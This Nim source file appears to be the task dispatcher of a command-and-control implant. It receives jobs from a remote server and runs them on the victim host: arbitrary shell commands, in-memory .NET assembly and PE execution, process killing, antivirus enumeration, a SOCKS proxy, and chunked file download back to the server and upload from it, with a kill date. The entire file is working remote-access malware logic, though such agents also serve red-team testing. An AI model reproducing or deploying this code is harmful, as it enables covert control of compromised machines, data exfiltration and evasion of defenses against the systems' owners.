import asyncdispatch
import base64
import config
import json
import http
import strformat
import strutils
import times
import task
import tables
from os import fileExists
from task import Job
from task import SocksMsg
import ../commands/cat
import ../commands/cd
import ../commands/cp
import ../commands/curl
import ../commands/drives
import ../commands/download
import ../commands/execute_assembly
import ../commands/getav
import ../commands/getenv
import ../commands/kill
import ../commands/ls
import ../commands/mkdir
import ../commands/mv
import ../commands/ps
import ../commands/pwd
import ../commands/register_file
import ../commands/rm
import ../commands/runPE
import ../commands/setenv
import ../commands/shell
import ../commands/upload
import ../commands/unsetenv
import ../commands/socks

proc checkDate*(kdate: string): bool =
    if cmp("yyyy-mm-dd", kdate) == 0:
        result = false
    else:
        let killDate = parse(kdate, "yyyy-MM-dd")
        echo "killDate: ", killDate
        let curDate = now()
        echo "curDate: ", curDate
        if killDate <= curDate:
            echo "KillDate has arrived"
            result = true
        else:
            result = false

proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): Future[tuple[jobs: seq[Job], newConfig: Config]] {.async.} =
    # Where the magic happens
    # Iterate through both tasks and running Jobs
    # The only running jobs are Upload and Download for now...
    var jobSeq: seq[Job]
    var socksOutMap: seq[SocksMsg]
    #var temp_socks = socks_ini
    var newConfig = curConfig
    #try:    
    #    temp_socks = waitFor socks.execute(socks_in)
    #except:
    #    echo "FUCK: ", getCurrentExceptionMsg()
    #socksOutMap = await socks.execute(socksMap)
    #for sock in socksMap:
    #    echo "we in jobLauncher now!"
    #    echo "And this is your sockMsg: ", "ID: ", sock.ServerId, ", Data: ", decode(sock.Data), ", Exit: ", sock.Exit
    #    sock.execute(sock)
    #    if sock.Exit == false:
    #        #socks.execute(sock.Data)
    #        echo "sockExit is false"
    for task in tasks:
        echo "your task is: ", $(task)
        var temp = ""
        var jtemp: Job
        let parsedJsonTask = if task.parameters.contains("{"): parseJson(task.parameters) else: %*{}
        jtemp.TaskId = task.id
        # TODO convert thread logic to async procs
        try:
            case task.action.toLower():
               of "cat":
                let spawnResult = await cat.execute(parsedJsonTask["path"].getStr())
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "Spawned cat proc \n"
               of "cd":
                let spawnResult = await cd.execute(task.parameters)
                temp = temp & fmt"Successfully changed working directory to {task.parameters}? : {$(spawnResult)}"
                when not defined(release):
                    echo "Spawned cd proc \n"
               of "cp":
                let spawnResult = await cp.execute(parsedJsonTask["source"].getStr(), parsedJsonTask["destination"].getStr())
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "spawned cp proc \n"
               of "curl":
                let headers = if parsedJsonTask.hasKey("headers"): parsedJsonTask["headers"].getStr() else: ""
                let body = if parsedJsonTask.hasKey("body"): parsedJsonTask["body"].getStr() else: ""
                let spawnResult = await curl.execute(parsedJsonTask["url"].getStr(), parsedJsonTask["method"].getStr(), headers, body)
                temp = temp & spawnResult
                when not defined(release):
                    echo "Spawned curl proc \n"
               of "download":
                jtemp.Download = true
                let path = parsedJsonTask["file_path"].getStr()
                echo "path for download: ", $(path)
                if len(jtemp.FileId) == 0:
                    echo "jumped into if"
                    if not fileExists(path):
                        echo "file path not exist"
                        temp = temp & "Error file does not exist"
                        jtemp.TotalChunks = 0
                        jtemp.Success = false
                    else:
                        jtemp.Path = await GetPath(path)
                        jtemp.TotalChunks = await GetTotalChunks(path, curConfig.ChunkSize)
                        jtemp.FileSize = await GetFileSize(path)

                if jtemp.ChunkNum != jtemp.TotalChunks:
                    echo "chunkNum ", jtemp.ChunkNum
                    echo "totalChunks ", jtemp.TotalChunks
                    let spawnResult = await download.execute(jtemp.Path, curConfig.ChunkSize, jtemp.ChunkNum, jtemp.TotalChunks, jtemp.FileSize)
                    temp = temp & spawnResult
                    echo "after download " #, temp
                    when not defined(release):
                        echo "Spawned download proc \n"
                    #inc jtemp.ChunkNum
                else:
                    echo "now we're in else"
                    when not defined(release):
                        echo "Setting downloadChunk to 0"
                    jtemp.ChunkNum = 0
               of "drives":
                let spawnResult = await drives.execute()
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "Drives has been called"
               of "execute_assembly":
                jtemp.ExeAsm = true
                if (jtemp.ChunkNum != jtemp.TotalChunks) or (jtemp.ChunkNum == 0 and jtemp.TotalChunks == 0):
                    let fileId = parsedJsonTask["file"].getStr()
                    jtemp.FileId = fileId
                    jtemp.Parameters = parsedJsonTask["args"].getStr()
                    echo "This is all we got: ", parsedJsonTask
                    echo "Got file with ID: ", fileId
                    #echo "Got this jtemp: ", jtemp
                    let uploadJson = %*
                             {
                                "action": "post_response",
                                "responses": [{
                                        "upload": {
                                                "chunk_size": curConfig.ChunkSize,
                                                "file_id": fileId,
                                                "chunk_num": jtemp.ChunkNum,
                                                "full_path": "C:\\Temp"
                                        },
                                        "task_id": jtemp.TaskId}]
                             }
                    try:
                        let resp = when defined(AESPSK): await Fetch(curConfig, $(uploadJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true)
                        let parsedJsonResp = when defined(AESPSK): parseJson(resp[36 .. ^1]) else: parseJson(decode(resp)[36 .. ^1])
                        #echo "[*] parsedJsonResp: ", parsedJsonResp
                        let respResponses = parsedJsonResp["responses"][0]
                        #echo "[*] respResponses: ", respResponses
                        jtemp.TotalChunks = respResponses["total_chunks"].getInt()
                        jtemp.ChunkNum = respResponses["chunk_num"].getInt()
                        #echo "After fetching the file: ",jtemp
                        let uploadChunkData = respResponses["chunk_data"].getStr()
                        # When file is smaller than chunksize
                        if (jtemp.ChunkNum == jtemp.TotalChunks):
                            let spawnResult = waitFor execute_assembly.execute(encode(uploadChunkData), parsedJsonTask["args"].getStr(), jtemp.TotalChunks)
                            temp = temp & $(spawnResult)
                            jtemp.Completed = true
                        else:
                            jtemp.Chunks.add(uploadChunkData)
                            echo "Added Chunk ", jtemp.ChunkNum, " ", jtemp.TotalChunks
                            #echo "This is Chunks[] after first task: ", jtemp.Chunks
                            inc jtemp.ChunkNum
                            echo "increased the ChunkNum: ", jtemp.ChunkNum
                    except:
                        let
                            e = getCurrentException()
                            msg = getCurrentExceptionMsg()
                        let error = fmt"An exception has occurred :" & repr(e) & " with message " & msg
                        echo error
                else:
                    jtemp.Response = "Command not implemented"
                    jtemp.Success = false
                    jtemp.Completed = true
                    jobSeq.add(jtemp)
                    continue
               of "exit":
                when not defined(release):
                    echo "It's been a fun ride but all good things eventually come to an end..."
                quit(QuitSuccess)
               of "getav":
                let spawnResult = await getav.execute()
                temp = $(spawnResult)
               of "getenv":
                let spawnResult = await getenv.execute()
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "Getenv has been called"
               of "jobs":
                jtemp.Success = true
                for job in runningJobs:
                    temp = temp & $(job) & "\n"
               of "kill":
                let spawnResult = await kill.execute(parseInt(task.parameters))
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "Spawned kill proc \n"
               of "ls":
                #let spawnResult = await ls.execute(parsedJsonTask["path"].getStr(), parseBool(parsedJsonTask["recurse"].getStr()))
                let spawnResult = await ls.execute(parsedJsonTask["path"].getStr())
                temp = $(spawnResult)
                when not defined(release):
                    echo "Inside ls and task.parameters: ", $(task.parameters)
               of "mkdir":
                let spawnResult = await mkdir.execute(task.parameters)
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "Spawned mkdir proc \n"
               of "mv":
                let spawnResult = await mv.execute(parsedJsonTask["source"].getStr(), parsedJsonTask["destination"].getStr())
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "Spawned mv proc \n"
               of "ps":
                let spawnResult = await ps.execute()
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "Spawned ps proc \n"
               of "pwd":
                let spawnResult = await pwd.execute()
                temp = temp & $(spawnResult)
               of "register_file":
                echo "inside register_file and jtemp is: ", $(jtemp)
                let spawnResult = await register_file.execute(parsedJsonTask["file"].getStr())
                temp = temp & $(spawnResult)
               of "rm":
                let spawnResult = await rm.execute(parsedJsonTask["path"].getStr())
                temp = temp & $(spawnResult)
               of "runpe":
                let spawnResult = await runPE.execute()
                temp = temp & $(spawnResult)
                echo "Spawned runPE proc \n"
               of "setenv":
                let params = task.parameters.split(" ")
                let spawnResult = await setenv.execute(params[0], params[1])
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "Spawned setenv proc \n"
               of "shell":
                let spawnResult = await shell.execute(task.parameters)
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "Spawned shell proc \n"
               of "sleep":
                # Update and modify newConfig that will be returned with new jitter and interval values if they exist
                newConfig.Jitter = if parsedJsonTask.hasKey("jitter"): parsedJsonTask["jitter"].getInt() else: curConfig.Jitter
                newConfig.Sleep = if parsedJsonTask.hasKey("interval"): parsedJsonTask["interval"].getInt() else: curConfig.Sleep
                when not defined(release):
                    echo "newJitter: ", newConfig.Jitter
                    echo "newInterval: ", newConfig.Sleep
               of "socks":
                let spawnResult = await socks.execute(parsedJsonTask["action"].getStr())
                temp = temp & $(spawnResult)
               of "unsetenv":
                let spawnResult = await unsetenv.execute(task.parameters)
                temp = temp & $(spawnResult)
                when not defined(release):
                    echo "Spawned unsetenv proc \n"
               of "upload":
                jtemp.Upload = true
                when defined(release):
                    echo "inside upload jtemp is: ", $(jtemp)
                if (jtemp.ChunkNum != jtemp.TotalChunks) or (jtemp.ChunkNum == 0 and jtemp.TotalChunks == 0):
                    let filePath = parsedJsonTask["remote_path"].getStr()
                    let fileName = parsedJsonTask["file_name"].getStr()
                    let fileId = parsedJsonTask["file"].getStr()
                    jtemp.Path = filePath
                    jtemp.FileId =fileId
                    when defined(release):
                        echo "This is all we got: ", parsedJsonTask
                        echo "Got file path: ", filePath, " and fileId: ", fileId
                    let uploadJson = %*
                             {
                                "action": "post_response",
                                "responses": [{
                                        "upload": {
                                                "chunk_size": curConfig.ChunkSize,
                                                "file_id": fileId,
                                                "chunk_num": jtemp.ChunkNum,
                                                "full_path": filePath,
                                        },
                                        "task_id": jtemp.TaskId}]
                             }
                    let resp = when defined(AESPSK): await Fetch(curConfig, $(uploadJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true)
                    when defined(release):
                        echo "resp for upload: ", $(resp)
                    let parsedJsonResp = when defined(AESPSK): parseJson(resp[36 .. ^1]) else: parseJson(decode(resp)[36 .. ^1])
                    echo "This is the server response: ", parsedJsonResp
                    let respResponses = parsedJsonResp["responses"][0]
                    echo respResponses
                    jtemp.TotalChunks = respResponses["total_chunks"].getInt()
                    echo "This is TotalChunks of first upload: ", jtemp.TotalChunks
                    jtemp.ChunkNum = respResponses["chunk_num"].getInt()
                    echo "This is ChunkNum of first upload: ", jtemp.ChunkNum
                    let uploadChunkData = respResponses["chunk_data"].getStr()
                    echo "This is data of first upload: ", uploadChunkData
                    let fullPath = filePath & file_name
                    echo "This is fullPath: ", fullPath
                    jtemp.Path = fullPath
                    when defined(release):
                        echo "uploadchunkData: ", $(uploadChunkData)
                    let spawnResult = await upload.execute(uploadChunkData, fullPath, jtemp.ChunkNum, curConfig.ChunkSize, jtemp.TotalChunks)
                    when defined(release):
                        echo "spawned upload proc \n"
                    temp = temp & $(spawnResult)
                    inc jtemp.ChunkNum
                else:
                    jtemp.Response = "Command not implemented"
                    jtemp.Success = false
                    jtemp.Completed = true
                    jobSeq.add(jtemp)
                    continue
        except:
            let 
                e = getCurrentException()
                msg = getCurrentExceptionMsg()
            let error = fmt"An exception has occurred when attempting to do {task.action.toLower()} job: " & " with message " & msg
            temp = temp & error
            continue
            # TODO make jtemp.Success = to false with a bool flag up top
        jtemp.Success = true
        echo "after all tasks ", jtemp.Success
        jtemp.Response = temp
        echo "this is the Response ", jtemp.Response
        if (jtemp.Upload == false and jtemp.ExeAsm == false): jtemp.Completed = true
        echo "set it to completed ", jtemp.Completed
        jobSeq.add(jtemp)

    # Identation matters or you can spend hours debugging...
    when not defined(release):
        echo "inside joblauncher and runningJobs: ", $(runningJobs)
    for job in runningJobs:
        echo "we in runningJobs now " #, $(job)
        when not defined(release):
            echo "Inside running jobs for loop here is a running job: ", $(job)
        # TODO apply DRY to upload and download compact into two distinct methods!
        var copyJob = job
        try:
            if job.Download and (job.ChunkNum != job.TotalChunks):
                echo "now we're in downloadJob"
                let spawnResult = await download.execute(job.Path, curConfig.ChunkSize, job.ChunkNum, job.TotalChunks, job.FileSize)
                copyJob.Response = spawnResult
                echo "got download again and in copyJob" #, copyJob.Response
                when not defined(release):
                    echo "Spawned download proc \n"
                inc copyJob.ChunkNum
            elif (job.Upload or job.ExeAsm) and (job.Completed == false):
                let uploadJson = %*
                         {
                            "action": "post_response",
                            "responses": [{
                                    "upload": {
                                            "chunk_size": curConfig.ChunkSize,
                                            "file_id": job.FileId,
                                            "chunk_num": job.ChunkNum,
                                            "full_path": job.Path,
                                    },
                                    "task_id": job.TaskId}]
                         }
                let resp = when defined(AESPSK): await Fetch(curConfig, $(uploadJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true)
                when not defined(release):
                    echo "resp for upload: ", $(resp)
                let parsedJsonResp = when defined(AESPSK): parseJson(resp[36 .. ^1]) else: parseJson(decode(resp)[36 .. ^1])
                #echo "The Response we got in runningJob: ", parsedJsonResp
                let respResponses = parsedJsonResp["responses"][0]
                copyJob.TotalChunks = respResponses["total_chunks"].getInt()
                let uploadChunkData = respResponses["chunk_data"].getStr()
                when not defined(release):
                    echo "uploadchunkData: ", $(uploadChunkData)
                echo "This is the Path in runningJob: ", job.Path
                if job.Upload:
                    let spawnResult = await upload.execute(uploadChunkData, job.Path, copyJob.ChunkNum, curConfig.ChunkSize, copyJob.TotalChunks)
                    copyJob.Response = $(spawnResult)
                elif job.ExeAsm:
                    copyJob.Chunks.add(uploadChunkData)
                    echo "We added another chunk ", copyJob.ChunkNum, " ", copyJob.TotalChunks
                    #echo "This is Chunks: ", copyJob.Chunks
                    #copyJob.Response = $(spawnResult)
                    inc copyJob.ChunkNum
                    if (job.ChunkNum == job.TotalChunks):
                        copyJob.Completed = true
                        var test = ""
                        for i in copyJob.Chunks:
                            test = test & decode(i)
                        echo copyJob.Parameters
                        #echo "We should call execute_assembly now"
                        let spawnResult = await execute_assembly.execute(encode(encode(test)), copyJob.Parameters, job.TotalChunks)
                        #let spawnResult = await upload.execute(encode(encode(test)), "C:\\Users\\Admin\\Documents\\seatdec.txt", copyJob.ChunkNum, curConfig.ChunkSize, copyJob.TotalChunks)
                        copyJob.Response = $(spawnResult)
        except:
            let
                e = getCurrentException()
                msg = getCurrentExceptionMsg()
            let error = "An exception has occurred when attempting to do job: " & repr(e) & " with message " & msg
            when not defined(release):
                echo "error has occurred inside running jobs for loop: ", error
        when not defined(release):
            echo "adding copyJob to jobSeq: ", $(copyJob)
        jobSeq.add(copyJob)
    
    result = (jobs: jobSeq, newConfig: newConfig)
            
